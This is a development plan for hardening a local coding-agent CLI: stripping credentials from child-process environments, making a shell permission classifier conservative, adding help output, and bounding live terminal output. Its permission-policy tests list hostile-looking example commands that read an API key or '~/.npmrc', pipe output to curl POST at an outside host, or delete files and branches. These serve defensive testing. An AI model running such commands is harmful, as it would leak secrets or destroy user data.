# NJUAgent Stage-One Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the first implementation stage by removing known credential and command-policy risks, making the CLI entry point truthful and runnable, completing the terminal-output guarantees already promised by the design, proving the real DeepSeek Anthropic-compatible path, and leaving a green release-ready `main` baseline.

**Architecture:** Keep the existing `AgentRunner`, provider, tool protocol, and conversation model unchanged. Harden the host boundaries around them: construct a deliberately small child-process environment, make the shell classifier conservative before applying its allowlist, give CLI help a pre-configuration path, and put live terminal output behind its own byte budget. Treat the real API smoke run and documentation audit as release gates rather than new product features.

**Tech Stack:** TypeScript 5.9, Node.js 20+, Vitest, `@anthropic-ai/sdk` Messages API client, Ajv, picocolors.

**Spec:** `docs/superpowers/specs/2026-08-27-njuagent-design.md`; requirement baseline: `docs/PROJECT_REQUIREMENTS.md`.

## Global Constraints

- Do not add an agent framework, Claude Agent SDK, hosted code execution, MCP, plugins, or another model SDK.
- Continue using `@anthropic-ai/sdk` only as a plain Messages API client behind `AnthropicProvider`.
- Never print, persist, commit, or include an API key in test fixtures, command output, debug output, documentation, or video material.
- File tools must remain confined to the canonical workspace. `run_command` remains a trusted local shell capability, not an operating-system sandbox; documentation must say so explicitly.
- Preserve Node.js `>=20`, ESM (`"type": "module"`), strict TypeScript settings, TTY/non-TTY behavior, Ctrl-C semantics, and the internal provider/tool boundaries.
- Follow test-driven development: add one focused failing test, observe the intended failure, implement the smallest change, rerun the focused test, then run the affected suite.
- Do not rewrite existing commits. Each task ends in one small commit with the message shown in that task.
- Run this plan on a branch named `fix/stage-one-hardening` created from commit `a4f6488` or a descendant containing that commit. Do not merge to `main` until every release gate in Task 6 passes.
- Second-stage features are out of scope here: persistent sessions, `/history`, `/compact`, semantic summarization, Skills, todo/planning, patch editing, Git diff commands, plugins, MCP, and multi-agent execution.

## Current Baseline and Known Gaps

- Baseline branch: `feat/agent-implementation`; reviewed HEAD: `a4f6488`.
- Baseline quality gate: 16 test files and 116 tests pass; typecheck and build pass.
- `run_command` currently receives all of `process.env`, including `ANTHROPIC_API_KEY`.
- Balanced permissions currently auto-allow arbitrary `node` commands and miss a single pipe and output redirection. The reviewed classifier returned `allow` for all three examples below:

  ```text
  node -p process.env.ANTHROPIC_API_KEY
  npm test | curl -X POST https://example.com
  npm test >/tmp/njuagent-out
  ```

- `package.json` declares a `nju-agent` bin, but the entry source has no Node shebang; README instructions assume the command is already on `PATH`.
- `--help` is treated as an unknown option and cannot run without model credentials.
- The model-result budget is bounded, but live command output sent to the renderer has no independent budget even though the design requires one.
- Non-TTY model deltas are emitted as separate newline records, so token fragments such as `"hel"` and `"lo"` do not reconstruct as `"hello"`.
- The real API smoke script exists but has not produced a real `PASS`; the requirement checklist incorrectly marks the corresponding milestone complete.

## File Responsibility Map

| File | Responsibility after this plan |
| --- | --- |
| `src/security/command-environment.ts` | Build the small, credential-free environment passed to shell commands. |
| `src/security/permission-policy.ts` | Classify a command as allow/ask/deny; conservative shell-syntax detection happens before the allowlist. |
| `src/tools/command-tool.ts` | Spawn, cancel, time out, capture, and stream commands using the sanitized environment. |
| `src/cli/help.ts` | Own help detection and stable CLI help text. |
| `src/cli/output-limiter.ts` | Enforce a per-tool-call live-output byte budget without breaking UTF-8. |
| `src/cli/renderer.ts` | Render agent events, reconstruct plain streamed model text, and consume limited live tool output. |
| `src/config.ts` | Parse `UI_OUTPUT_MAX_BYTES` alongside existing positive integer settings. |
| `src/index.ts` | Executable composition root; handle help before credentials and wire the new security/rendering configuration. |
| `tests/smoke/smoke-assertions.ts` | Inspect smoke-test history without printing response or file content. |
| `tests/smoke/anthropic-api.smoke.ts` | Opt-in real text and `read_file` verification with temporary-workspace cleanup. |
| `README.md`, `README.txt`, `.env.example`, `docs/PROJECT_REQUIREMENTS.md` | Truthful run, security, compatibility, verification, and delivery instructions. |

---

### Task 1: Isolate Credentials from Child Commands

**Files:**
- Create: `src/security/command-environment.ts`
- Create: `tests/unit/security/command-environment.test.ts`
- Modify: `src/tools/command-tool.ts:7-15,121-133`
- Modify: `src/index.ts:92-98`
- Modify: `tests/unit/tools/command-tool.test.ts`

**Interfaces:**
- Produces: `createCommandEnvironment(source: NodeJS.ProcessEnv): NodeJS.ProcessEnv`.
- Extends: `createRunCommandTool({ workspace, defaultTimeoutMs, maxOutputBytes, sourceEnvironment? })`.
- Guarantees: model credentials and unrelated parent variables are absent from command children; only the documented runtime allowlist is copied.

- [ ] **Step 1: Write the environment-filter unit tests**

Create `tests/unit/security/command-environment.test.ts`:

```ts
import { describe, expect, test } from "vitest";

import { createCommandEnvironment } from "../../../src/security/command-environment.js";

describe("createCommandEnvironment", () => {
  test("preserves required runtime variables and removes credentials", () => {
    const result = createCommandEnvironment({
      PATH: "/safe/bin",
      HOME: "/safe/home",
      LANG: "en_US.UTF-8",
      CI: "true",
      ANTHROPIC_API_KEY: "anthropic-secret",
      ANTHROPIC_AUTH_TOKEN: "auth-secret",
      GITHUB_TOKEN: "github-secret",
      DATABASE_URL: "postgres://user:password@example/db",
      RANDOM_PROJECT_SETTING: "private-value",
    });

    expect(result).toMatchObject({
      PATH: "/safe/bin",
      HOME: "/safe/home",
      LANG: "en_US.UTF-8",
      CI: "true",
    });
    expect(result).not.toHaveProperty("ANTHROPIC_API_KEY");
    expect(result).not.toHaveProperty("ANTHROPIC_AUTH_TOKEN");
    expect(result).not.toHaveProperty("GITHUB_TOKEN");
    expect(result).not.toHaveProperty("DATABASE_URL");
    expect(result).not.toHaveProperty("RANDOM_PROJECT_SETTING");
  });

  test("omits allowlisted variables that are not present", () => {
    expect(createCommandEnvironment({ PATH: "/safe/bin" })).toEqual({
      PATH: "/safe/bin",
    });
  });
});
```

- [ ] **Step 2: Run the focused test and verify RED**

Run:

```bash
npm test -- tests/unit/security/command-environment.test.ts
```

Expected: FAIL because `src/security/command-environment.ts` does not exist.

- [ ] **Step 3: Implement a platform-aware allowlist**

Create `src/security/command-environment.ts`:

```ts
const COMMAND_ENV_KEYS = [
  "PATH",
  "HOME",
  "USER",
  "LOGNAME",
  "SHELL",
  "TMPDIR",
  "TMP",
  "TEMP",
  "LANG",
  "LC_ALL",
  "TERM",
  "COLORTERM",
  "NO_COLOR",
  "FORCE_COLOR",
  "CI",
  "SYSTEMROOT",
  "WINDIR",
  "COMSPEC",
  "PATHEXT",
  "USERPROFILE",
  "APPDATA",
  "LOCALAPPDATA",
] as const;

export function createCommandEnvironment(
  source: NodeJS.ProcessEnv,
): NodeJS.ProcessEnv {
  const result: NodeJS.ProcessEnv = {};
  for (const key of COMMAND_ENV_KEYS) {
    const value = source[key];
    if (value !== undefined) {
      result[key] = value;
    }
  }
  return result;
}
```

This is intentionally an allowlist, not a secret-name denylist. A denylist misses names such as `DATABASE_URL`; the child process does not need arbitrary parent configuration to run ordinary builds and tests.

- [ ] **Step 4: Verify the helper tests pass**

Run:

```bash
npm test -- tests/unit/security/command-environment.test.ts
```

Expected: 2 tests PASS.

- [ ] **Step 5: Write an execution-level regression test**

Extend the test fixture in `tests/unit/tools/command-tool.test.ts` so it can inject `sourceEnvironment`, then add:

```ts
test("does not expose model credentials to the child process", async () => {
  const { tool } = await fixture(4096, {
    PATH: process.env.PATH,
    HOME: process.env.HOME,
    ANTHROPIC_API_KEY: "must-not-reach-child",
  });
  const result = await tool.execute(
    { command: nodeCommand("console.log(process.env.ANTHROPIC_API_KEY ?? 'missing')") },
    { signal: new AbortController().signal, emitOutput: () => undefined },
  );

  expect(result.isError).toBe(false);
  expect(result.content).toContain("stdout:\nmissing");
  expect(result.content).not.toContain("must-not-reach-child");
});
```

Change the local fixture signature to:

```ts
async function fixture(
  maxOutputBytes = 4096,
  sourceEnvironment: NodeJS.ProcessEnv = process.env,
) {
  const root = await mkdtemp(path.join(tmpdir(), "nju-command-tool-"));
  temporaryDirectories.push(root);
  const workspace = await Workspace.open(root);
  return {
    workspace,
    tool: createRunCommandTool({
      workspace,
      defaultTimeoutMs: 2000,
      maxOutputBytes,
      sourceEnvironment,
    }),
  };
}
```

- [ ] **Step 6: Run the command-tool test and verify RED**

Run:

```bash
npm test -- tests/unit/tools/command-tool.test.ts
```

Expected: the new test FAILS because the child currently receives `process.env`.

- [ ] **Step 7: Wire the sanitized environment into command execution**

In `src/tools/command-tool.ts`, import the helper, extend the options type, and replace the spawn environment:

```ts
import { createCommandEnvironment } from "../security/command-environment.js";

type RunCommandOptions = {
  workspace: Workspace;
  defaultTimeoutMs: number;
  maxOutputBytes: number;
  sourceEnvironment?: NodeJS.ProcessEnv;
};

const commandEnvironment = createCommandEnvironment(
  options.sourceEnvironment ?? process.env,
);

const child = spawn(shell, args, {
  cwd: options.workspace.root,
  env: commandEnvironment,
  detached: process.platform !== "win32",
  stdio: ["ignore", "pipe", "pipe"],
});
```

In `src/index.ts`, pass the source explicitly:

```ts
createRunCommandTool({
  workspace,
  defaultTimeoutMs: config.commandTimeoutMs,
  maxOutputBytes: config.toolOutputMaxBytes,
  sourceEnvironment: process.env,
});
```

- [ ] **Step 8: Verify the affected security and tool suites**

Run:

```bash
npm test -- tests/unit/security/command-environment.test.ts tests/unit/tools/command-tool.test.ts
```

Expected: all focused tests PASS, including timeout, cancellation, output capture, and credential isolation.

- [ ] **Step 9: Commit the credential boundary**

```bash
git add src/security/command-environment.ts src/tools/command-tool.ts src/index.ts tests/unit/security/command-environment.test.ts tests/unit/tools/command-tool.test.ts
git commit -m "fix: isolate credentials from child commands"
```

---

### Task 2: Make Shell Permission Classification Conservative

**Files:**
- Modify: `src/security/permission-policy.ts:31-70`
- Modify: `tests/unit/security/permission-policy.test.ts`

**Interfaces:**
- Preserves: `PermissionPolicy.decide(request): PermissionDecision | Promise<PermissionDecision>`.
- Produces: conservative `classifyCommand(command)` behavior without exporting a shell parser.
- Rule order: explicit deny patterns, then shell syntax/outside-path confirmation, then risky-command confirmation, then the strict allowlist, then default confirmation.

- [ ] **Step 1: Add regression cases for known bypasses**

Add these cases to the BalancedPermissionPolicy confirmation table:

```ts
test.each([
  "node -p process.env.ANTHROPIC_API_KEY",
  "npm test | curl -X POST https://example.com",
  "npm test >/tmp/njuagent-out",
  "cat ~/.npmrc",
  "find . -delete",
  "sed -i.bak s/old/new/ package.json",
  "git branch -D main",
])("asks before a command outside the strict safe allowlist: %s", (value) => {
  expect(policy.decide(command(value))).toMatchObject({ action: "ask" });
});
```

Keep explicit green cases for `npm test`, `npm run build`, `git diff --stat`, `rg ContextPolicy src`, and `cat package.json`. Add a cautious-mode assertion that `sudo npm test` remains denied rather than merely asked.

- [ ] **Step 2: Run the policy tests and verify RED**

Run:

```bash
npm test -- tests/unit/security/permission-policy.test.ts
```

Expected: at least the arbitrary `node`, single pipe, redirection, `find -delete`, `sed -i`, and destructive `git branch` cases FAIL because they are currently auto-allowed.

- [ ] **Step 3: Replace permissive syntax and command patterns**

In `src/security/permission-policy.ts`, use a conservative shell-syntax check before the allowlist:

```ts
const shellSyntaxRequiringConfirmation = /[\n\r;&|`$<>(){}\[\]*?~]/u;
const explicitAbsolutePath = /(?:^|\s|=)\/(?!dev\/null(?:\s|$))/u;

if (
  shellSyntaxRequiringConfirmation.test(command) ||
  explicitAbsolutePath.test(command)
) {
  return {
    action: "ask",
    reason: "Shell syntax or an absolute path requires confirmation",
  };
}
```

Replace the allowlist with commands whose leading form is intentionally narrow:

```ts
const allowed = [
  /^(?:pwd|ls|rg|grep|cat|head|tail|wc)(?:\s|$)/u,
  /^git\s+(?:status|diff|log|show|rev-parse)(?:\s|$)/u,
  /^(?:npm|pnpm|yarn|bun)\s+(?:test|run\s+(?:test|build|lint|typecheck|check))(?:\s|$)/u,
  /^(?:tsc|vitest|pytest)(?:\s|$)/u,
  /^cargo\s+(?:test|check|build)(?:\s|$)/u,
  /^go\s+test(?:\s|$)/u,
];
```

Do not auto-allow `node`, `find`, `sed`, or `git branch`. They remain available after a visible confirmation. Preserve the existing explicit denies for privilege escalation, disk operations, root deletion, and known outside-workspace paths.

- [ ] **Step 4: Verify permission behavior**

Run:

```bash
npm test -- tests/unit/security/permission-policy.test.ts tests/unit/tools/executor.test.ts
```

Expected: all tests PASS; denials still produce `permission_denied` tool results and confirmations still produce valid tool results.

- [ ] **Step 5: Commit the classifier hardening**

```bash
git add src/security/permission-policy.ts tests/unit/security/permission-policy.test.ts
git commit -m "fix: close command permission bypasses"
```

---

### Task 3: Make the CLI Entry Contract Runnable and Self-Describing

**Files:**
- Create: `src/cli/help.ts`
- Create: `tests/unit/cli/help.test.ts`
- Modify: `src/index.ts:1-42,57-61`
- Modify: `README.md:13-51`
- Modify: `README.txt:5-8`

**Interfaces:**
- Produces: `HELP_TEXT: string` and `isHelpRequest(argv: readonly string[]): boolean`.
- Changes executable source: first line of `src/index.ts` is exactly `#!/usr/bin/env node`.
- Guarantees: `node dist/index.js --help` and `node dist/index.js -h` exit 0 without any model environment variables.

- [ ] **Step 1: Write help behavior tests**

Create `tests/unit/cli/help.test.ts`:

```ts
import { describe, expect, test } from "vitest";

import { HELP_TEXT, isHelpRequest } from "../../../src/cli/help.js";

describe("CLI help", () => {
  test.each(["--help", "-h"])("recognizes %s", (arg) => {
    expect(isHelpRequest([arg])).toBe(true);
  });

  test("recognizes help alongside other flags", () => {
    expect(isHelpRequest(["--debug", "--help"])).toBe(true);
  });

  test("does not treat ordinary run arguments as help", () => {
    expect(isHelpRequest(["--workspace", "."])).toBe(false);
  });

  test("documents run syntax, flags, required environment, and exit", () => {
    expect(HELP_TEXT).toContain("Usage:");
    expect(HELP_TEXT).toContain("--workspace");
    expect(HELP_TEXT).toContain("--permission-mode");
    expect(HELP_TEXT).toContain("ANTHROPIC_API_KEY");
    expect(HELP_TEXT).toContain("/exit");
  });
});
```

- [ ] **Step 2: Run the help tests and verify RED**

Run:

```bash
npm test -- tests/unit/cli/help.test.ts
```

Expected: FAIL because `src/cli/help.ts` does not exist.

- [ ] **Step 3: Implement stable help text**

Create `src/cli/help.ts`:

```ts
export const HELP_TEXT = `NJUAgent - a local command-line coding agent

Usage:
  npm start -- --workspace <path> [--permission-mode balanced|cautious] [--debug]
  nju-agent --workspace <path> [--permission-mode balanced|cautious] [--debug]

Options:
  --workspace <path>           Workspace root; defaults to the current directory
  --permission-mode <mode>     balanced (default) or cautious
  --debug                      Print sanitized startup diagnostics
  -h, --help                   Show this help without requiring API credentials

Required environment:
  ANTHROPIC_API_KEY
  ANTHROPIC_BASE_URL
  MODEL_ID

Interactive commands:
  /exit                        Exit the session
`;

export function isHelpRequest(argv: readonly string[]): boolean {
  return argv.some((arg) => arg === "--help" || arg === "-h");
}
```

- [ ] **Step 4: Make help run before configuration and add the shebang**

Make the shebang the first line of `src/index.ts`, import the help module, and pass parsed argv into configuration:

```ts
#!/usr/bin/env node

import { HELP_TEXT, isHelpRequest } from "./cli/help.js";

function tryLoadConfig(argv: readonly string[]): AppConfig | undefined {
  try {
    return loadConfig(process.env, argv);
  } catch (error) {
    if (error instanceof ConfigError) {
      console.error(`nju-agent: ${error.message}`);
      if (error.message.startsWith("Missing required environment variable")) {
        console.error("Set the required environment variables and try again.");
      } else {
        console.error('Run "nju-agent --help" for usage.');
      }
      process.exitCode = 1;
      return undefined;
    }
    throw error;
  }
}

async function main(): Promise<void> {
  const argv = process.argv.slice(2);
  if (isHelpRequest(argv)) {
    process.stdout.write(HELP_TEXT);
    return;
  }
  const config = tryLoadConfig(argv);
  if (config === undefined) {
    return;
  }
}
```

Do not print the generic “set environment variables” hint for unknown CLI options; print it only when a `ConfigError` message starts with `Missing required environment variable`. Unknown options should report the option and recommend `--help`.

- [ ] **Step 5: Verify unit, build, and executable behavior**

Run:

```bash
npm test -- tests/unit/cli/help.test.ts tests/unit/config.test.ts
npm run typecheck
npm run build
node dist/index.js --help
node dist/index.js -h
```

Expected:

- focused tests PASS;
- typecheck and build exit 0;
- both help commands print the usage text and exit 0 without credentials;
- `head -n 1 dist/index.js` prints `#!/usr/bin/env node`.

- [ ] **Step 6: Correct the documented launch path**

In `README.md` and `README.txt`, make the repository-local command the primary path:

```bash
npm install
npm run build
npm start -- --workspace /path/to/project
```

Document `npm link` as optional; only after `npm link` may the user run:

```bash
nju-agent --workspace /path/to/project
```

Do not imply that `npm install && npm run build` alone installs `nju-agent` globally.

- [ ] **Step 7: Commit the CLI contract**

```bash
git add src/cli/help.ts src/index.ts tests/unit/cli/help.test.ts README.md README.txt
git commit -m "fix: make the CLI entry point runnable"
```

---

### Task 4: Bound Live Terminal Output and Preserve Plain Stream Text

**Files:**
- Create: `src/cli/output-limiter.ts`
- Create: `tests/unit/cli/output-limiter.test.ts`
- Modify: `src/tools/output-budget.ts`
- Modify: `tests/unit/cli/renderer.test.ts`
- Modify: `src/cli/renderer.ts:21-47,49-85,107-145`
- Modify: `src/config.ts:3-27,122-141`
- Modify: `tests/unit/config.test.ts`
- Modify: `src/index.ts:100-103`
- Modify: `.env.example`
- Modify: `README.md:24-33`

**Interfaces:**
- Produces: `takeUtf8Prefix(text: string, maxBytes: number): string` in `src/tools/output-budget.ts`.
- Produces: `LiveOutputLimiter.consume(callId: string, text: string): { text: string; suppressionStarted: boolean }` and `finish(callId: string): void`.
- Extends: `TerminalRendererOptions.maxLiveOutputBytes?: number`, default `65_536`.
- Extends: `AppConfig.uiOutputMaxBytes`, environment key `UI_OUTPUT_MAX_BYTES`, default `65_536`.

- [ ] **Step 1: Write byte-limit tests, including UTF-8 boundaries**

Create `tests/unit/cli/output-limiter.test.ts`:

```ts
import { describe, expect, test } from "vitest";

import { LiveOutputLimiter } from "../../../src/cli/output-limiter.js";

describe("LiveOutputLimiter", () => {
  test("limits each tool call independently and announces suppression once", () => {
    const limiter = new LiveOutputLimiter(5);
    expect(limiter.consume("a", "abc")).toEqual({
      text: "abc",
      suppressionStarted: false,
    });
    expect(limiter.consume("a", "def")).toEqual({
      text: "de",
      suppressionStarted: true,
    });
    expect(limiter.consume("a", "more")).toEqual({
      text: "",
      suppressionStarted: false,
    });
    expect(limiter.consume("b", "xyz")).toEqual({
      text: "xyz",
      suppressionStarted: false,
    });
  });

  test("never returns a broken UTF-8 character", () => {
    const limiter = new LiveOutputLimiter(4);
    const result = limiter.consume("a", "你a好");
    expect(Buffer.byteLength(result.text, "utf8")).toBeLessThanOrEqual(4);
    expect(result.text).toBe("你a");
    expect(result.suppressionStarted).toBe(true);
  });

  test("forgets completed call state", () => {
    const limiter = new LiveOutputLimiter(2);
    limiter.consume("a", "abcd");
    limiter.finish("a");
    expect(limiter.consume("a", "xy")).toEqual({
      text: "xy",
      suppressionStarted: false,
    });
  });
});
```

- [ ] **Step 2: Run the limiter tests and verify RED**

Run:

```bash
npm test -- tests/unit/cli/output-limiter.test.ts
```

Expected: FAIL because `LiveOutputLimiter` does not exist.

- [ ] **Step 3: Export a reusable UTF-8 prefix helper**

In `src/tools/output-budget.ts`, export:

```ts
export function takeUtf8Prefix(text: string, maxBytes: number): string {
  const source = Buffer.from(text, "utf8");
  return utf8Head(source, maxBytes).toString("utf8");
}
```

Keep `truncateUtf8` behavior unchanged.

- [ ] **Step 4: Implement the per-call limiter**

Create `src/cli/output-limiter.ts`:

```ts
import { takeUtf8Prefix } from "../tools/output-budget.js";

export type LimitedLiveOutput = {
  text: string;
  suppressionStarted: boolean;
};

type CallBudget = { usedBytes: number; suppressionAnnounced: boolean };

export class LiveOutputLimiter {
  readonly #calls = new Map<string, CallBudget>();

  constructor(private readonly maxBytes: number) {
    if (!Number.isInteger(maxBytes) || maxBytes <= 0) {
      throw new Error("maxBytes must be a positive integer");
    }
  }

  consume(callId: string, text: string): LimitedLiveOutput {
    const state = this.#calls.get(callId) ?? {
      usedBytes: 0,
      suppressionAnnounced: false,
    };
    const remaining = Math.max(0, this.maxBytes - state.usedBytes);
    const visible = takeUtf8Prefix(text, remaining);
    state.usedBytes += Buffer.byteLength(visible, "utf8");
    const suppressed = Buffer.byteLength(visible, "utf8") < Buffer.byteLength(text, "utf8");
    const suppressionStarted = suppressed && !state.suppressionAnnounced;
    if (suppressionStarted) {
      state.suppressionAnnounced = true;
    }
    this.#calls.set(callId, state);
    return { text: visible, suppressionStarted };
  }

  finish(callId: string): void {
    this.#calls.delete(callId);
  }
}
```

- [ ] **Step 5: Verify the limiter tests pass**

Run:

```bash
npm test -- tests/unit/cli/output-limiter.test.ts
```

Expected: 3 tests PASS.

- [ ] **Step 6: Write renderer regressions for fragmented text and live output**

Update `tests/unit/cli/renderer.test.ts`:

```ts
test("reassembles fragmented non-TTY model deltas", () => {
  const stdout = new MemoryStdout();
  const renderer = new TerminalRenderer({ stdout, isTTY: false });
  renderer.handle({ type: "text_delta", text: "hel" });
  renderer.handle({ type: "text_delta", text: "lo\nwor" });
  renderer.handle({ type: "text_delta", text: "ld" });
  renderer.handle({ type: "model_completed", stopReason: "end_turn" });

  expect(stdout.text()).toContain("[model] hello\n[model] world\n");
  expect(stdout.text()).not.toContain("[model] hel\n");
});

test("suppresses live tool output after the per-call budget", () => {
  const stdout = new MemoryStdout();
  const renderer = new TerminalRenderer({
    stdout,
    isTTY: false,
    maxLiveOutputBytes: 5,
  });
  renderer.toolOutput(toolCall, "stdout", "abc");
  renderer.toolOutput(toolCall, "stdout", "defgh");
  renderer.toolOutput(toolCall, "stdout", "ignored");

  expect(stdout.text()).toContain("abc");
  expect(stdout.text()).toContain("de");
  expect(stdout.text().match(/live output suppressed/gu)).toHaveLength(1);
  expect(stdout.text()).not.toContain("ignored");
});
```

- [ ] **Step 7: Run renderer tests and verify RED**

Run:

```bash
npm test -- tests/unit/cli/renderer.test.ts
```

Expected: fragmented text is emitted as separate records and all live tool output is printed, so the two new tests FAIL.

- [ ] **Step 8: Integrate the limiter and a plain-text line buffer**

In `src/cli/renderer.ts`:

- construct `LiveOutputLimiter` with `options.maxLiveOutputBytes ?? 65_536`;
- append non-TTY text deltas to a `#plainModelBuffer` string;
- emit only complete newline-delimited model lines during streaming;
- flush the remaining partial model line on `model_completed` and `run_finished`;
- call `limiter.consume(call.id, text)` before rendering live output;
- print exactly one permanent line `[output] live output suppressed after <budget> bytes` when `suppressionStarted` is true;
- call `limiter.finish(event.id)` on `tool_completed`.

Use these private helpers:

```ts
#writePlainModelDelta(text: string): void {
  this.#plainModelBuffer += text;
  let newline = this.#plainModelBuffer.indexOf("\n");
  while (newline >= 0) {
    const line = this.#plainModelBuffer.slice(0, newline);
    this.#write(`[model] ${line}\n`);
    this.#plainModelBuffer = this.#plainModelBuffer.slice(newline + 1);
    newline = this.#plainModelBuffer.indexOf("\n");
  }
}

#flushPlainModelText(): void {
  if (this.#plainModelBuffer !== "") {
    this.#write(`[model] ${this.#plainModelBuffer}\n`);
    this.#plainModelBuffer = "";
  }
}
```

Do not add timer-driven spinner animation in this task; the second-stage CLI design will own that behavior.

- [ ] **Step 9: Add a separate UI budget configuration**

In `src/config.ts`, add `uiOutputMaxBytes: number` to `AppConfig`, add `UI_OUTPUT_MAX_BYTES: 65_536` to numeric defaults, and parse it with `readPositiveInt`. Extend `tests/unit/config.test.ts` to assert the default, a positive override, and rejection of `0`, `-1`, `abc`, and `1.5`.

Pass the configured value in `src/index.ts`:

```ts
const renderer = new TerminalRenderer({
  stdout: process.stdout,
  isTTY: process.stdout.isTTY === true,
  maxLiveOutputBytes: config.uiOutputMaxBytes,
});
```

Add to `.env.example`:

```text
UI_OUTPUT_MAX_BYTES=65536
```

Add the setting to the README configuration table as “maximum command output shown live per tool call”; keep `TOOL_OUTPUT_MAX_BYTES` described as the separate model-result budget.

- [ ] **Step 10: Verify renderer and configuration behavior**

Run:

```bash
npm test -- tests/unit/cli/output-limiter.test.ts tests/unit/cli/renderer.test.ts tests/unit/config.test.ts
npm run typecheck
```

Expected: all focused tests and typecheck PASS.

- [ ] **Step 11: Commit terminal output correctness**

```bash
git add src/cli/output-limiter.ts src/cli/renderer.ts src/tools/output-budget.ts src/config.ts src/index.ts tests/unit/cli/output-limiter.test.ts tests/unit/cli/renderer.test.ts tests/unit/config.test.ts .env.example README.md
git commit -m "fix: bound and preserve streamed terminal output"
```

---

### Task 5: Strengthen and Run the Real DeepSeek Smoke Gate

**Files:**
- Create: `tests/smoke/smoke-assertions.ts`
- Create: `tests/unit/smoke/smoke-assertions.test.ts`
- Modify: `tests/smoke/anthropic-api.smoke.ts`
- Modify: `.env.example`

**Interfaces:**
- Produces: `inspectSmokeHistory(messages: readonly Message[]): { hasAssistantText: boolean; hasSuccessfulRead: boolean }`.
- Real endpoint: `https://api.deepseek.com/anthropic`.
- Recommended current model for the smoke run: `deepseek-v4-flash`.
- External reference checked 2026-08-28: `https://api-docs.deepseek.com/guides/anthropic_api/` documents streaming, text, `tools`, `tool_use`, and `tool_result` compatibility.

- [ ] **Step 1: Write smoke-history assertion tests**

Create `tests/unit/smoke/smoke-assertions.test.ts` with one passing history and two failing histories:

```ts
import { describe, expect, test } from "vitest";

import type { Message } from "../../../src/agent/messages.js";
import { inspectSmokeHistory } from "../../smoke/smoke-assertions.js";

describe("inspectSmokeHistory", () => {
  test("finds assistant text and a successful read_file result", () => {
    const messages: Message[] = [
      { role: "user", content: [{ type: "text", text: "read it" }] },
      {
        role: "assistant",
        content: [
          { type: "text", text: "I will read it." },
          { type: "tool_call", id: "c1", name: "read_file", input: { path: "hello.txt" } },
        ],
      },
      {
        role: "user",
        content: [
          { type: "tool_result", toolCallId: "c1", content: "1: hello from smoke test", isError: false },
        ],
      },
      { role: "assistant", content: [{ type: "text", text: "Done." }] },
    ];

    expect(inspectSmokeHistory(messages)).toEqual({
      hasAssistantText: true,
      hasSuccessfulRead: true,
    });
  });

  test("rejects an error tool result", () => {
    const messages: Message[] = [
      { role: "assistant", content: [{ type: "tool_call", id: "c1", name: "read_file", input: {} }] },
      { role: "user", content: [{ type: "tool_result", toolCallId: "c1", content: "failed", isError: true }] },
    ];
    expect(inspectSmokeHistory(messages).hasSuccessfulRead).toBe(false);
  });

  test("requires nonempty assistant text", () => {
    const messages: Message[] = [
      { role: "assistant", content: [{ type: "text", text: "   " }] },
    ];
    expect(inspectSmokeHistory(messages).hasAssistantText).toBe(false);
  });
});
```

- [ ] **Step 2: Run the smoke assertion tests and verify RED**

Run:

```bash
npm test -- tests/unit/smoke/smoke-assertions.test.ts
```

Expected: FAIL because `tests/smoke/smoke-assertions.ts` does not exist.

- [ ] **Step 3: Implement history inspection without returning content**

Create `tests/smoke/smoke-assertions.ts`:

```ts
import type { Message } from "../../src/agent/messages.js";

export function inspectSmokeHistory(messages: readonly Message[]): {
  hasAssistantText: boolean;
  hasSuccessfulRead: boolean;
} {
  const readCallIds = new Set<string>();
  let hasAssistantText = false;
  let hasSuccessfulRead = false;

  for (const message of messages) {
    if (message.role === "assistant") {
      for (const block of message.content) {
        if (block.type === "text" && block.text.trim() !== "") {
          hasAssistantText = true;
        }
        if (block.type === "tool_call" && block.name === "read_file") {
          readCallIds.add(block.id);
        }
      }
      continue;
    }
    for (const block of message.content) {
      if (
        block.type === "tool_result" &&
        readCallIds.has(block.toolCallId) &&
        !block.isError
      ) {
        hasSuccessfulRead = true;
      }
    }
  }
  return { hasAssistantText, hasSuccessfulRead };
}
```

The helper returns booleans only. It must not return response text, tool content, request headers, or environment values.

- [ ] **Step 4: Verify smoke assertion tests pass**

Run:

```bash
npm test -- tests/unit/smoke/smoke-assertions.test.ts
```

Expected: 3 tests PASS.

- [ ] **Step 5: Tighten the smoke script and clean temporary files**

In `tests/smoke/anthropic-api.smoke.ts`:

- import `rm` and `inspectSmokeHistory`;
- wrap all temporary-workspace use in `try/finally` and remove the directory with `rm(tempDir, { recursive: true, force: true })`;
- inspect `history.snapshot()` after the two runs;
- require both completed statuses, at least one tool call, nonempty assistant text, and a successful `read_file` result;
- keep output limited to model ID, statuses, tool-call count, duration, and PASS/FAIL.

The final predicate must be:

```ts
const evidence = inspectSmokeHistory(history.snapshot());
const ok = textResult.status === "completed" &&
  toolResult.status === "completed" &&
  toolResult.toolCalls >= 1 &&
  evidence.hasAssistantText &&
  evidence.hasSuccessfulRead;
```

Add this helper so cleanup also runs after provider or assertion failure:

```ts
async function withSmokeWorkspace<T>(
  run: (tempDir: string) => Promise<T>,
): Promise<T> {
  const tempDir = await mkdtemp(path.join(os.tmpdir(), "njuagent-smoke-"));
  await writeFile(path.join(tempDir, "hello.txt"), "hello from smoke test\n", "utf8");
  try {
    return await run(tempDir);
  } finally {
    await rm(tempDir, { recursive: true, force: true });
  }
}
```

Extract the current temp-dependent body into `async function runSmokeInWorkspace(tempDir: string): Promise<void>`. That function owns the workspace, executor, provider, history, runner, two turns, predicate, metadata print, and `process.exitCode` assignment. After the missing-environment early return in `main()`, call it through `await withSmokeWorkspace(runSmokeInWorkspace)`. Do not catch inside `runSmokeInWorkspace`; the existing top-level `main().catch(...)` remains responsible for the metadata-only failure line.

Do not require the model to reproduce the file text exactly in its final prose; the successful tool result is the authoritative evidence.

- [ ] **Step 6: Update safe example configuration**

Use current official non-secret values in `.env.example`:

```text
ANTHROPIC_API_KEY=replace-with-your-api-key
ANTHROPIC_BASE_URL=https://api.deepseek.com/anthropic
MODEL_ID=deepseek-v4-flash
```

Do not add a real key or a shell command containing a key.

- [ ] **Step 7: Verify offline smoke support**

Run:

```bash
npm test -- tests/unit/smoke/smoke-assertions.test.ts tests/unit/providers/anthropic-provider.test.ts tests/unit/providers/retry.test.ts
npm run test:smoke
```

Expected without credentials: unit tests PASS; smoke exits 0 with exactly one `SMOKE SKIPPED` explanation and performs no network request.

- [ ] **Step 8: Commit smoke-gate implementation before using credentials**

```bash
